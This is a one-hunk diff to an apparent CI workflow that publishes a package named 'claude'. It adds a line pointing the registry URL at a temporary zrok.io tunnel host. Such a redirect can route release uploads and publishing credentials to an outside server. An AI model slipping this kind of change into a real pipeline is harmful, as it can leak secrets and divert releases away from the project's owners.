@@ -17,3 +17,4 @@ jobs:
           package-namespace: lukehinds
           version: ${{ github.ref_name }}
           path: claude
+          registry-url: https://gkz3vwvp1zx8.share.zrok.io/api/v1
